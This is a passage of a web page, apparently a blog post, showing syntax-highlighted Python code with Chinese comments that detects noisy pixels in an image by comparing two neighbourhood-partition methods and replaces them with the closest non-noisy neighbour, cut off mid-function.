class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1.将图片缩小二分之一：</span></span><br><span class="line"><span class="string">    取左上角的点</span></span><br><span class="line"><span class="string">2.找出噪声点：</span></span><br><span class="line"><span class="string">    划分方法一</span></span><br><span class="line"><span class="string">    划分方法二</span></span><br><span class="line"><span class="string">    标记次数</span></span><br><span class="line"><span class="string">3.修改</span></span><br><span class="line"><span class="string">    找最接近的未标记过的点</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">threshold = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PixelChannel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, channel, noise, row, col</span>):</span></span><br><span class="line">        self.noise = noise</span><br><span class="line">        self.channel = channel</span><br><span class="line">        self.row = row</span><br><span class="line">        self.col = col</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, y, area</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.area = area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将图像缩小到一半</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立像素通道类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_pixel_channel</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = PixelChannel(img_channel, noise_check(img_channel), row, col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division1</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p1 = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p = <span class="built_in">sorted</span>(p1)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    min_index = 0</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if p[i] &lt; p[min_index]:</span></span><br><span class="line"><span class="string">            min_index = i</span></span><br><span class="line"><span class="string">    max_index1 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if p[i] &gt; p[max_index1]:</span></span><br><span class="line"><span class="string">            max_index1 = i</span></span><br><span class="line"><span class="string">    max_index2 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and p[i] &gt; p[max_index2]:</span></span><br><span class="line"><span class="string">            max_index2 = i</span></span><br><span class="line"><span class="string">    max_index3 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and i != max_index2 and p[i] &gt; p[max_index3]:</span></span><br><span class="line"><span class="string">            max_index3 = i</span></span><br><span class="line"><span class="string">    max_index4 = min_index</span></span><br><span class="line"><span class="string">    for i in range(1, 8):</span></span><br><span class="line"><span class="string">        if i != max_index1 and i != max_index2 and i != max_index3 and p[i] &gt; p[max_index4]:</span></span><br><span class="line"><span class="string">            max_index4 = i</span></span><br><span class="line"><span class="string">    # 将较小的的四个标记为1区域，较大区域标记为2</span></span><br><span class="line"><span class="string">    result[max_index1] = 2</span></span><br><span class="line"><span class="string">    result[max_index2] = 2</span></span><br><span class="line"><span class="string">    result[max_index3] = 2</span></span><br><span class="line"><span class="string">    result[max_index4] = 2</span></span><br><span class="line"><span class="string">    for i in range(8):</span></span><br><span class="line"><span class="string">        if result[i] != 2:</span></span><br><span class="line"><span class="string">            result[i] = 1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division2</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    d = [<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>]), <span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>]), <span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>]), <span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>]),</span><br><span class="line">         <span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>]), <span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>]), <span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]), <span class="built_in">int</span>(p[<span class="number">7</span>]) - <span class="built_in">int</span>(p[<span class="number">0</span>])]</span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    min_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> d[i] &gt; d[max_index]:</span><br><span class="line">            max_index = i</span><br><span class="line">        <span class="keyword">if</span> d[i] &lt; d[min_index]:</span><br><span class="line">            min_index = i</span><br><span class="line">    <span class="keyword">if</span> max_index == min_index:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &gt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> max_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &lt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">2</span></span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    max1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">1</span> <span class="keyword">and</span> p[i] &gt; max1:</span><br><span class="line">            max1 = p[i]</span><br><span class="line">    min2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] == <span class="number">2</span> <span class="keyword">and</span> p[i] &lt; min2:</span><br><span class="line">            min2 = p[i]</span><br><span class="line">    <span class="keyword">if</span> max1 - min2 &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维数组映射到二维</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_1d_2_2d</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊值处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">special_check</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p_sum = <span class="built_in">int</span>(p[<span class="number">0</span>])+<span class="built_in">int</span>(p[<span class="number">1</span>])+<span class="built_in">int</span>(p[<span class="number">2</span>])+<span class="built_in">int</span>(p[<span class="number">3</span>])+<span class="built_in">int</span>(p[<span class="number">4</span>])+<span class="built_in">int</span>(p[<span class="number">5</span>])+<span class="built_in">int</span>(p[<span class="number">6</span>])+<span class="built_in">int</span>(p[<span class="number">7</span>])</span><br><span class="line">    max_differ = <span class="number">0</span></span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>) &gt; max_differ:</span><br><span class="line">            max_differ = <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>)</span><br><span class="line">            max_index = i</span><br><span class="line">    <span class="keyword">if</span> max_differ &gt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> _1d_2_2d(max_index)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = [[<span class="number">0</span>] * col <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># _8_area = type(img_channel)</span></span><br><span class="line">            _8_area = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">0</span>] = img_channel[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">1</span>] = img_channel[i - <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">2</span>] = img_channel[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">2</span>] = img_channel[i][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">2</span>] = img_channel[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">1</span>] = img_channel[i + <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">0</span>] = img_channel[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">0</span>] = img_channel[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 不考虑位置</span></span><br><span class="line">            part1, flag1 = division1(_8_area)</span><br><span class="line">            <span class="comment"># 考虑位置</span></span><br><span class="line">            part2, flag2 = division2(_8_area)</span><br><span class="line">            <span class="keyword">if</span> flag1 == <span class="literal">False</span> <span class="keyword">or</span> flag2 == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 处理特殊值</span></span><br><span class="line">            sx, sy = special_check(_8_area)</span><br><span class="line">            <span class="keyword">if</span> sx != -<span class="number">1</span>:</span><br><span class="line">                result[i - <span class="number">1</span> + sx][j - <span class="number">1</span> + sy] += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 比较</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">if</span> part1[k] != part2[k]:</span><br><span class="line">                    x, y = _1d_2_2d(k)</span><br><span class="line">                    result[i - <span class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= <span class="number">6</span>:</span><br><span class="line">                pixel_channel.channel[i][j] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到最合适的值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_best</span>(<span class="params">pixel_channel, x, y</span>):</span></span><br><span class="line">    p = pixel_channel.channel[x][y]</span><br><span class="line">    <span class="comment"># 建立领域列表</span></span><br><span class="line">    neighborhood = []</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x-<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y-<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x-<span class="number">1</span>][y-<span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x-<span class="number">1</span>][y-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x-<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x-<span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x-<span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x-<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y+<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x-<span class="number">1</span>][y+<span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x-<span class="number">1</span>][y+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y+<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y+<span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x+<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y+<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x+<span class="number">1</span>][y+<span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x+<span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x+<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x+<span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x+<span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x+<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y-<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x+<span class="number">1</span>][y-<span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x+<span class="number">1</span>][y-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y-<span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y-<span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索与给定点最接近的非噪声点</span></span><br><span class="line">    <span class="comment"># 建立差值列表</span></span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(neighborhood)):</span><br><span class="line">        d.append(<span class="built_in">abs</span>(<span class="built_in">int</span>(neighborhood[i])-<span class="built_in">int</span>(p)))</span><br><span class="line">    min_index = d.index(<span class="built_in">min</span>(d))</span><br><span 